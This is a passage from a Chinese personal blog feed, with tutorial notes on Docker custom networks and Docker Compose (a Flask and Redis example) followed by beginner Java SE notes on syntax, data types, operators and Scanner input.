&#123;</span><br><span class="line">                    <span class="string">&quot;Subnet&quot;</span>: <span class="string">&quot;192.17.0.0/16&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Gateway&quot;</span>: <span class="string">&quot;192.17.0.1&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Internal&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Attachable&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Ingress&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;ConfigFrom&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Network&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;ConfigOnly&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Containers&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;Options&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;Labels&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>基于自定义网络启动容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用自定义网络</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker run -d -P --name tomcat-net-1 --net mynet my-tomcat01:1.0</span></span><br><span class="line"><span class="comment"># 发现已经成功使用上</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network inspect mynet</span></span><br><span class="line">&#125;,</span><br><span class="line">        <span class="string">&quot;ConfigOnly&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Containers&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;6ccd4eceb20ec77000793369ee924106f698c236e48f53e082b0cbd830289b13&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;tomcat-net-1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;EndpointID&quot;</span>: <span class="string">&quot;cf8a18045268e43e29e3e7ae2315af57a58560860f8fe9ce64c5f015c599dc17&quot;</span>,</span><br><span class="line">                <span class="string">&quot;MacAddress&quot;</span>: <span class="string">&quot;02:42:c0:11:00:02&quot;</span>,</span><br><span class="line">                <span class="string">&quot;IPv4Address&quot;</span>: <span class="string">&quot;192.17.0.2/16&quot;</span>,</span><br><span class="line">                <span class="string">&quot;IPv6Address&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</li>
<li><p>发现，我们自定义的网络docker都已经帮我们维护好了对应的关系 </p>
<p>所以我们平时都可以这样使用网络，不使用–link效果一样，所有东西实时维护好，直接域名 ping 通。</p>
</li>
</ol>
<h2 id="4、网络连通"><a href="#4、网络连通" class="headerlink" title="4、网络连通"></a>4、网络连通</h2><ol>
<li><p>启动两个容器（默认，基于docker0的网络）</p>
<p>启动两个容器（默认，基于docker0的网络）</p>
</li>
<li><p>使用network connect 命令连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># docker network connect mynet tomcat-1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>再次验证，通了</p>
</li>
<li><p>看一下tomcat-1的网络信息(tomcat01拥有了双ip)</p>
</li>
<li><p>再看一下mynet的网络信息</p>
</li>
</ol>
<p>结论：如果要跨网络操作别人，就需要使用 <code>docker network connect [OPTIONS] NETWORK CONTAINER</code> 连接</p>
<h1 id="十、Docker-compose"><a href="#十、Docker-compose" class="headerlink" title="十、Docker compose"></a>十、Docker compose</h1><p>Compose 是用于定义和运行多容器 Docker 应用程序的工具。</p>
<p>通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>
<p>Compose 使用的三个步骤：</p>
<ul>
<li>使用 Dockerfile 定义应用程序的环境</li>
<li>使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行</li>
<li>最后，执行 docker-compose up 命令来启动并运行整个应用程序</li>
</ul>
<p>中文文档：<a href="http://www.dockerinfo.net/docker-compose-%e9%a1%b9%e7%9b%ae">http://www.dockerinfo.net/docker-compose-%e9%a1%b9%e7%9b%ae</a></p>
<p>官方文档：<a href="https://docs.docker.com/compose/">https://docs.docker.com/compose/</a></p>
<blockquote>
<p>compose安装  要注意和Docker同一个版本</p>
</blockquote>
<blockquote>
<p>这里有独立版和插件版两种，区别感觉不大，主要就是命令的使用的一点点差别，我这主要使用的是独立版</p>
</blockquote>
<blockquote>
<p><strong>Compose 独立版</strong></p>
<p>请注意，Compose standalone 使用<code>-compose</code>语法 而不是当前标准语法<code>compose</code>。<br>例如，<code>docker-compose up</code>使用 Compose standalone 时输入 ，而不是<code>docker compose up</code>。</p>
</blockquote>
<ol>
<li><p>要下载并安装 Compose 独立版，请运行：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -SL https://github.com/docker/compose/releases/download/v2.29.6/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将可执行权限应用于安装目标路径中的独立二进制文件。</p>
</li>
<li><p>使用 测试并执行撰写命令<code>docker-compose</code>。</p>
<blockquote>
<p><strong>提示</strong></p>
<p>如果安装后命令<code>docker-compose</code>失败，请检查您的路径。您还可以创建指向或路径中任何其他目录的符号链接<code>/usr/bin</code>。例如：</p>
<p>$ sudo ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose &#x2F;usr&#x2F;bin&#x2F;docker-compose</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>compose使用</p>
</blockquote>
<p>1、设置</p>
<ol>
<li><p>为项目创建目录：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> composetest</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> composetest</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在您的项目目录中创建一个名为的文件<code>app.py</code>并粘贴以下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">cache = redis.Redis(host=<span class="string">&#x27;redis&#x27;</span>, port=<span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hit_count</span>():</span><br><span class="line">    retries = <span class="number">5</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> cache.incr(<span class="string">&#x27;hits&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> redis.exceptions.ConnectionError <span class="keyword">as</span> exc:</span><br><span class="line">            <span class="keyword">if</span> retries == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> exc</span><br><span class="line">            retries -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    count = get_hit_count()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! I have been seen &#123;&#125; times.\n&#x27;</span>.<span class="built_in">format</span>(count)</span><br></pre></td></tr></table></figure>

<p>在此示例中，是应用程序网络上的 redis 容器的主机名，并使用<code>redis</code>默认端口。<code>6379</code></p>
<blockquote>
<p><strong>笔记</strong></p>
<p>请注意函数的编写方式<code>get_hit_count</code>。如果 Redis 服务不可用，此基本重试循环会多次尝试请求。这在应用程序上线时启动时很有用，但如果在应用程序的生命周期内需要随时重新启动 Redis 服务，也会使应用程序更具弹性。在集群中，这也有助于处理节点之间的瞬时连接断开。</p>
</blockquote>
</li>
<li><p>在您的项目目录中创建另一个名为的文件<code>requirements.txt</code>并粘贴以下代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flask</span><br><span class="line">redis</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建一个<code>Dockerfile</code>并粘贴以下代码：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># syntax=docker/dockerfile:1</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.10</span>-alpine</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /code</span></span><br><span class="line"><span class="keyword">ENV</span> FLASK_APP=app.py</span><br><span class="line"><span class="keyword">ENV</span> FLASK_RUN_HOST=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache gcc musl-dev linux-headers</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt requirements.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;flask&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;--debug&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>重要的</strong></p>
<p>检查<code>Dockerfile</code>文件扩展名是否为<code>.txt</code>。某些编辑器可能会自动附加此文件扩展名，从而导致运行应用程序时出现错误。</p>
</blockquote>
</li>
</ol>
<p>2、在Compose文件中定义服务</p>
<p>Compose 简化了整个应用程序堆栈的控制，使您可以轻松地在单个易于理解的 YAML 配置文件中管理服务、网络和卷。</p>
<p>在您的项目目录中创建一个名为的文件<code>compose.yaml</code>并粘贴以下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8000:5000&quot;</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;redis:alpine&quot;</span></span><br></pre></td></tr></table></figure>

<p>该Compose文件定义了两个服务：<code>web</code>和<code>redis</code>。</p>
<p>该<code>web</code>服务使用从当前目录中构建的镜像<code>Dockerfile</code>。然后它将容器和主机绑定到公开端口。<code>8000</code>此示例服务使用 Flask Web 服务器的默认端口<code>5000</code>。</p>
<p>该<code>redis</code>服务使用 从 Docker Hub 注册表中提取的公共<a href="https://registry.hub.docker.com/_/redis/">Redis映像。</a></p>
<p>3、使用 Compose 构建并运行您的应用</p>
<p>使用单个命令，您可以从配置文件创建并启动所有服务。</p>
<ol>
<li>从您的项目目录中，通过运行启动您的应用程序<code>docker compose up</code>。、</li>
<li>每访问一次网站，次数应该都会增加</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Java学习之旅</title>
    <url>/2024/09/14/Java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/</url>
    <content><![CDATA[<p>学学Java吧！</p>
<span id="more"></span>

<h1 id="一、Java-SE基础"><a href="#一、Java-SE基础" class="headerlink" title="一、Java SE基础"></a>一、Java SE基础</h1><p>​	这里就是Java学习的开始，从这开始我的Java复习，以及笔记整理之路。</p>
<h2 id="计算机预科"><a href="#计算机预科" class="headerlink" title="计算机预科"></a>计算机预科</h2><p>​	这都是最基础的，大概就提一下。</p>
<p>1、打开CMD</p>
<p>2、管理员身份运行CMD</p>
<p>3、常见的Dos命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd  切换路径</span><br><span class="line">dir 查看目录</span><br><span class="line">exit  退出终端</span><br><span class="line">ipconfig  查看电脑ip信息</span><br><span class="line">calc  打开计算器</span><br><span class="line">mspaint  打开画图</span><br><span class="line">notepad  打开记事本</span><br><span class="line">ping  对网站发起ping操作</span><br><span class="line">md或mkdir  创建文件夹</span><br><span class="line">rmdir或rd  删除空目录</span><br><span class="line">del 删除目录或文件</span><br></pre></td></tr></table></figure>

<h2 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h2><h3 id="1、Java简介"><a href="#1、Java简介" class="headerlink" title="1、Java简介"></a>1、Java简介</h3><ul>
<li><p>Java的特性和优势</p>
<ul>
<li>简单性</li>
<li>面向对象</li>
<li>可移植性</li>
<li>高性能</li>
<li>分布式</li>
<li>动态性</li>
<li>多线程</li>
<li>安全性</li>
<li>健壮性</li>
</ul>
</li>
<li><p>Java的三大版本</p>
<ul>
<li>JavaSE： 标准版（桌面程序、控制台开发……）</li>
<li>JavaME：嵌入式开发（手机、加点…..）</li>
<li>JavaEE：企业级开发（Web端、服务器开发……）</li>
</ul>
</li>
<li><p>Java的安装与卸载开发环境（这个网上都有的，搜下很多）</p>
</li>
</ul>
<h3 id="2、Hello-World"><a href="#2、Hello-World" class="headerlink" title="2、Hello World"></a>2、Hello World</h3><ul>
<li>代码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!Java!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以直接通过java先编译为字节码class文件再执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac Hello.java           ---&gt;得到Hello.class</span><br><span class="line">java Hello.class           ---&gt;Hello World!Java!</span><br></pre></td></tr></table></figure>

<ul>
<li><p>注释</p>
<p>java中的注释有三种</p>
<ul>
<li>单行注释：只能注释一行文字   Ctrl  + &#x2F;</li>
<li>多行注释：可以注释一段文字  Ctrl  +  Shift +  &#x2F;</li>
<li>文档注释：一般用于表名文档创建者、创建日期、说明等</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//   单行注释</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文档注释</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="3、标识符和关键字"><a href="#3、标识符和关键字" class="headerlink" title="3、标识符和关键字"></a>3、标识符和关键字</h3><ul>
<li><p>标识符</p>
<ul>
<li>所有的标识符都应该以字母，$符号或者下划线开始</li>
<li>不能使用关键字作为变量名或者方法名</li>
<li>不建议使用中文或者拼音</li>
</ul>
</li>
<li><p>关键字</p>
<table>
<thead>
<tr>
<th>abstract</th>
<th>boolean</th>
<th>break</th>
<th>byte</th>
<th>case</th>
</tr>
</thead>
<tbody><tr>
<td>catch</td>
<td>char</td>
<td>const</td>
<td>class</td>
<td>continue</td>
</tr>
<tr>
<td>default</td>
<td>do</td>
<td>double</td>
<td>else</td>
<td>extends</td>
</tr>
<tr>
<td>final</td>
<td>finally</td>
<td>float</td>
<td>for</td>
<td>goto</td>
</tr>
<tr>
<td>if</td>
<td>implements</td>
<td>import</td>
<td>instanceof</td>
<td>int</td>
</tr>
<tr>
<td>interface</td>
<td>long</td>
<td>native</td>
<td>new</td>
<td>package</td>
</tr>
<tr>
<td>private</td>
<td>protected</td>
<td>public</td>
<td>return</td>
<td>short</td>
</tr>
<tr>
<td>static</td>
<td>strictfp</td>
<td>super</td>
<td>switch</td>
<td>this</td>
</tr>
<tr>
<td>throw</td>
<td>throws</td>
<td>transient</td>
<td>try</td>
<td>void</td>
</tr>
<tr>
<td>volatile</td>
<td>while</td>
<td>synchronized</td>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="4、数据类型"><a href="#4、数据类型" class="headerlink" title="4、数据类型"></a>4、数据类型</h3><ul>
<li><p>静态类型语言</p>
<ul>
<li>变量定义时有类型声明的语言</li>
</ul>
</li>
<li><p>强类型语言</p>
<ul>
<li>强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型了。</li>
</ul>
</li>
<li><p>数据类型基本分类</p>
<ul>
<li>基本类型<ul>
<li>数值类型<ul>
<li>整数<ul>
<li>byte   1字节   -128~127   （一字节八位）</li>
<li>short  2字节   -2^15~2^15-1</li>
<li>int       4字节   -2^31~2^31-1</li>
<li>long    8字节   -2^63~2^63-1</li>
</ul>
</li>
<li>浮点数<ul>
<li>float   4字节</li>
<li>double   8字节</li>
</ul>
</li>
<li>字符<ul>
<li>char  2字节</li>
</ul>
</li>
<li>布尔<ul>
<li>boolean  1位 只有true和false两值</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>引用类型<ul>
<li>类</li>
<li>接口</li>
<li>数组</li>
</ul>
</li>
</ul>
</li>
<li><p>什么是字节</p>
<ul>
<li>位（bit） 计算机内部数据存储的最小单位， 1011 1101是一个八位的二进制数</li>
<li>字节（byte）  是计算机中数据处理的基本单位，习惯用大写B表示，1B（byte字节） &#x3D;  8bit（位）</li>
<li>字符：是指计算机中使用的字母、数字、字和符号。<ul>
<li>1bit表示1位</li>
<li>1Byte表示一个字节1B&#x3D;8b</li>
<li>1024B&#x3D;1KB</li>
<li>1024KB&#x3D;1M</li>
<li>1024M&#x3D;1G</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>数据类型拓展</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不同进制的表示</span></span><br><span class="line"><span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">010</span>;   <span class="comment">// 八进制0</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0x10</span>;  <span class="comment">// 十六进制0x</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转义字符</span></span><br><span class="line"><span class="comment">// \t   制表符</span></span><br><span class="line"><span class="comment">// \n   换行</span></span><br></pre></td></tr></table></figure>

<h3 id="5、类型转换"><a href="#5、类型转换" class="headerlink" title="5、类型转换"></a>5、类型转换</h3><ul>
<li><p>由于Java是强类型语言，所以在进行某些运算的时候，需要进行对应的类型转换</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">低 ------------------------------------------------&gt; 高</span><br><span class="line"><span class="type">byte</span> -&gt; <span class="type">short</span> -&gt; <span class="type">char</span> -&gt; <span class="type">int</span> -&gt; <span class="type">long</span> -&gt; <span class="type">float</span> -&gt; <span class="type">double</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>运算中，不同类型的数据先转化为统一类型在进行运算</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//强制类型转换</span></span><br><span class="line">(<span class="type">int</span>)<span class="number">12.3</span> ---&gt; <span class="number">12</span></span><br><span class="line">(<span class="type">double</span>)<span class="number">12</span>  ----&gt;  <span class="number">12.00</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 不过要注意数据类型的大小，防止内存溢出的出现</span></span><br><span class="line"><span class="comment">// JDK7新特性，数字之间可以用下划线分割</span></span><br><span class="line"><span class="type">int</span> <span class="variable">money</span> <span class="operator">=</span> <span class="number">10_0000_0000</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6、变量与常量"><a href="#6、变量与常量" class="headerlink" title="6、变量与常量"></a>6、变量与常量</h3><ul>
<li>变量：可以变化的量 </li>
<li>Java是一种强类型语言，每个变量都要申明其数据类型</li>
<li>Java变量是程序中最基本的存储单元，其要素包括变量名、变量类型和作用域</li>
<li>每个变量都必须要有对应的类型，可以使基本类型也可以是引用类型</li>
<li>变量名必须是合法的标识符</li>
<li>变量声明需要以分号结尾</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类变量 static</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">double</span> <span class="variable">salary</span> <span class="operator">=</span> <span class="number">2500</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例变量:从属于对象：实例变量：从属于对象；如果不自行初始化，这个类型的默认值 0 0.0</span></span><br><span class="line"><span class="comment">// 布尔值：默认是 faLse</span></span><br><span class="line"><span class="comment">// 除了基本类型，其余的都是null</span></span><br></pre></td></tr></table></figure>

<ul>
<li>变量的一些命名规范（使你的代码更加规范化）<ul>
<li>所有变量、方法、类名：见名如意（可以采用英文命名）</li>
<li>类成员变量：首字母小写和驼峰原则：monthSalary</li>
<li>局部变量：首字母小写和驼峰原则</li>
<li>常量：大写字母加下划线：MAX_VALUE</li>
<li>类名：首字母大写加驼峰原则：Man，GoodMan</li>
<li>方法名：首字母小写和驼峰原则：runRun()</li>
</ul>
</li>
</ul>
<h3 id="7、基本运算符"><a href="#7、基本运算符" class="headerlink" title="7、基本运算符"></a>7、基本运算符</h3><blockquote>
<p>Java支持如下运算符</p>
</blockquote>
<ul>
<li><p>算术运算符：+，-，*，&#x2F;，%，++，–</p>
</li>
<li><p>赋值运算符: &#x3D;</p>
</li>
<li><p>关系运算符：&gt;，≤，&gt;&#x3D;，&lt;&#x3D;，&#x3D;&#x3D;，!&#x3D;， instanceof</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">instanceof是Java中的二元运算符，左边是对象，右边是类；当对象是右边类或子类所创建对象时，返回true；否则，返回false。</span><br></pre></td></tr></table></figure>
</li>
<li><p>逻辑运算符：&amp;&amp;，‖，!</p>
</li>
<li><p>位运算符：&amp;，|，~，^，&gt;&gt;，&lt;&lt;，&gt;&gt;&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;：按位与</span><br><span class="line">|：按位或</span><br><span class="line">~：按位非</span><br><span class="line">^：按位异或</span><br><span class="line">&lt;&lt;：左位移运算符</span><br><span class="line">&gt;&gt;：右位移运算符</span><br><span class="line">&lt;&lt;&lt;：无符号左移运算符</span><br></pre></td></tr></table></figure>
</li>
<li><p>条件运算符: ？：</p>
</li>
<li><p>扩展赋值运算符：+&#x3D;，-&#x3D;，*&#x3D;，&#x2F;&#x3D;</p>
</li>
</ul>
<h3 id="8、自增自减运算符、初始Math类"><a href="#8、自增自减运算符、初始Math类" class="headerlink" title="8、自增自减运算符、初始Math类"></a>8、自增自减运算符、初始Math类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a++ 与  ++a的区别</span><br><span class="line"><span class="comment">// ++在前表示先+1再去执行代码  在后则是相反</span></span><br><span class="line"><span class="comment">// --也是同理</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>Math类的一些常见用法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Math.abs(a)：取a的绝对值</span><br><span class="line">Math.sqrt(a)：取a的平方根</span><br><span class="line">Math.cbrt(a)：取a的立方根</span><br><span class="line">Math.max(a,b)：取a、b之间的最大值</span><br><span class="line">Math.min(a,b)：取a、b之间的最小值</span><br><span class="line">Math.pow(a,b)：取a的b平方</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="9、逻辑运算符、位运算符"><a href="#9、逻辑运算符、位运算符" class="headerlink" title="9、逻辑运算符、位运算符"></a>9、逻辑运算符、位运算符</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&amp;&amp;   <span class="comment">// 逻辑与：两个变量都为真，结果才为true</span></span><br><span class="line">||   <span class="comment">// 逻辑或：两个变量有一个为真，则结果才为true</span></span><br><span class="line">!    <span class="comment">// 取反：如果是真，则变为假；如果是假，则变为真</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        A = 0011 1100</span></span><br><span class="line"><span class="comment">        B = 0000 1101</span></span><br><span class="line"><span class="comment">----------------------------------</span></span><br><span class="line"><span class="comment">        A&amp;B = 0000 1100</span></span><br><span class="line"><span class="comment">        A|B = 0011 1101</span></span><br><span class="line"><span class="comment">        A^B = 0011 0001</span></span><br><span class="line"><span class="comment">        ~B = 1111 0010</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        2*8 = 16</span></span><br><span class="line"><span class="comment">        &lt;&lt; *2</span></span><br><span class="line"><span class="comment">        &gt;&gt; /2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br></pre></td></tr></table></figure>

<h3 id="10、三元运算符"><a href="#10、三元运算符" class="headerlink" title="10、三元运算符"></a>10、三元运算符</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 三元运算符</span></span><br><span class="line"><span class="comment">// x ？ y : z</span></span><br><span class="line"><span class="comment">// 如果x==true,则结果为y，否则结果为z</span></span><br></pre></td></tr></table></figure>

<h3 id="11、包机制"><a href="#11、包机制" class="headerlink" title="11、包机制"></a>11、包机制</h3><ul>
<li><p>为了更好的组织类，Java提供了包机制，用于区别类名的命名空间</p>
</li>
<li><p>包语句的语法格式是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg1[.pkg2[.pkg3……]];</span><br></pre></td></tr></table></figure>
</li>
<li><p>一般利用公司域名倒置作为包名；<a href="http://www.baidu.com/">www.baidu.com</a> —&gt;   com&#x2F;baidu&#x2F;www</p>
</li>
<li><p>为了能够使用某个包的成员，我们需要再Java程序中明确导入该包，使用“import”语句可完成此功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> package1[.package2……].(classname | *);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="12、JavaDoc"><a href="#12、JavaDoc" class="headerlink" title="12、JavaDoc"></a>12、JavaDoc</h3><ul>
<li><p>JavaDoc是用来生成自己API文档的。</p>
</li>
<li><p>参数信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- @ author作者名</span><br><span class="line">- @ version版本号</span><br><span class="line">- @ since指明需要最早使用的jdk版本</span><br><span class="line">- @ paran参数名</span><br><span class="line">- @ return返回值情况</span><br><span class="line">- @ throws异常抛出情况</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javadoc -encoding UTF-<span class="number">8</span> -charset UTF-<span class="number">8</span> Doc.java   <span class="comment">// 注意保持编码一致</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="1、用户交互Scanner"><a href="#1、用户交互Scanner" class="headerlink" title="1、用户交互Scanner"></a>1、用户交互Scanner</h3><ul>
<li><p>Java给我们提供了一个工具类，去实现程序与人的交互，获取用户的输入，java.util.Scanner是Java5的新特性，我们可以使用Scanner类去获取用户输入。</p>
</li>
<li><p>基本语法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过 Scanner类的next()与 nextLine()方法获取输入的字符串，在读取前我们一般需要使用 hasNext()与 hasNextLine()判断是否还有输入的数据。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span>(scanner.hasNext())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;输入的内容为:&quot;</span> + str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(scanner.hasNextLine())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;输出的内容为:&quot;</span> + str);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>next()：</p>
<ol>
<li>一定要读取到有效字符才可以结束输入。</li>
<li>对输入有效字符之前遇到的空白，会自动去除</li>
<li>只有输入有效字符才将其后输入的空白作为分隔符或者结束符</li>
<li>next不能获取带空格的字符串</li>
</ol>
</li>
<li><p>nextLine():</p>
<ol>
<li>以Enter为结束符，也就是说返回的是Enter前所有字符</li>
<li>可以获取空白</li>
</ol>
</li>
</ul>
<h3 id="2、顺序结构"><a href="#2、顺序结构" class="headerlink" title="2、顺序结构"></a>2、顺序结构</h3><ul>
<li>Java的基本结构就是顺序结构，除非特别指明，负责就是按照顺序一句一句执行。</li>
<li>顺序结构是最简单的算法结构</li>
